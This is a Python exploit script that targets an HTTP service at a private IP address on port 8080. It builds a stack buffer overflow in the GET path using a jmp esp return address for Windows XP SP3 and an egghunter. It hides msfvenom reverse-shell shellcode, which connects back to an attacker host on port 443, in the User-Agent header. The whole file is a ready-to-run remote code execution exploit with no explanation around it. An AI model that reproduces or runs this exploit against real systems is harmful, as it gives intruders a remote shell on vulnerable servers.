#!/usr/bin/env python

import socket
import struct

host = "192.168.122.213"
port = 8080
# 0x7e45b310 jmp esp Windows XP SP3 english
ret = "\x10\xb3\x45\x7e"
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x74\x69\x6d\x6f\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.10 LPORT=443 -f c -b "\x00\x20\x3f\x0a\x0d"
shellcode = ("\xbd\xc3\xf0\x1c\xa1\xda\xc2\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
        "\x52\x31\x6f\x12\x83\xc7\x04\x03\xac\xfe\xfe\x54\xce\x17\x7c"
        "\x96\x2e\xe8\xe1\x1e\xcb\xd9\x21\x44\x98\x4a\x92\x0e\xcc\x66"
        "\x59\x42\xe4\xfd\x2f\x4b\x0b\xb5\x9a\xad\x22\x46\xb6\x8e\x25"
        "\xc4\xc5\xc2\x85\xf5\x05\x17\xc4\x32\x7b\xda\x94\xeb\xf7\x49"
        "\x08\x9f\x42\x52\xa3\xd3\x43\xd2\x50\xa3\x62\xf3\xc7\xbf\x3c"
        "\xd3\xe6\x6c\x35\x5a\xf0\x71\x70\x14\x8b\x42\x0e\xa7\x5d\x9b"
        "\xef\x04\xa0\x13\x02\x54\xe5\x94\xfd\x23\x1f\xe7\x80\x33\xe4"
        "\x95\x5e\xb1\xfe\x3e\x14\x61\xda\xbf\xf9\xf4\xa9\xcc\xb6\x73"
        "\xf5\xd0\x49\x57\x8e\xed\xc2\x56\x40\x64\x90\x7c\x44\x2c\x42"
        "\x1c\xdd\x88\x25\x21\x3d\x73\x99\x87\x36\x9e\xce\xb5\x15\xf7"
        "\x23\xf4\xa5\x07\x2c\x8f\xd6\x35\xf3\x3b\x70\x76\x7c\xe2\x87"
        "\x79\x57\x52\x17\x84\x58\xa3\x3e\x43\x0c\xf3\x28\x62\x2d\x98"
        "\xa8\x8b\xf8\x0f\xf8\x23\x53\xf0\xa8\x83\x03\x98\xa2\x0b\x7b"
        "\xb8\xcd\xc1\x14\x53\x34\x82\xda\x0c\x4c\x58\xb3\x4e\xb0\x5d"
        "\xf8\xc6\x56\x37\xee\x8e\xc1\xa0\x97\x8a\x99\x51\x57\x01\xe4"
        "\x52\xd3\xa6\x19\x1c\x14\xc2\x09\xc9\xd4\x99\x73\x5c\xea\x37"
        "\x1b\x02\x79\xdc\xdb\x4d\x62\x4b\x8c\x1a\x54\x82\x58\xb7\xcf"
        "\x3c\x7e\x4a\x89\x07\x3a\x91\x6a\x89\xc3\x54\xd6\xad\xd3\xa0"
        "\xd7\xe9\x87\x7c\x8e\xa7\x71\x3b\x78\x06\x2b\x95\xd7\xc0\xbb"
        "\x60\x14\xd3\xbd\x6c\x71\xa5\x21\xdc\x2c\xf0\x5e\xd1\xb8\xf4"
        "\x27\x0f\x59\xfa\xf2\x8b\x69\xb1\x5e\xbd\xe1\x1c\x0b\xff\x6f"
        "\x9f\xe6\x3c\x96\x1c\x02\xbd\x6d\x3c\x67\xb8\x2a\xfa\x94\xb0"
        "\x23\x6f\x9a\x67\x43\xba")

stage1 = "A"*515 + ret + egghunter
stage2 = "timotimo" + shellcode

buf = "GET /" + stage1 + " HTTP/1.1\r\n"
#buf += "User-Agent: Mozilla/4.0\r\n"
buf += "User-Agent: " + stage2 + "\r\n"
buf += "Host: " + host + ":" + str(port) + "\r\n"
buf += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf += "Accept-Language: en-us\r\n"
buf += "Accept-Encoding: gzip, deflate\r\n"
buf += "Referer: http://" + host + "\r\n"
buf += "Connection: Keep-Alive\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print("[*] Sending " + str(len(stage1)) + " bytes")
s.send(buf)
s.close()

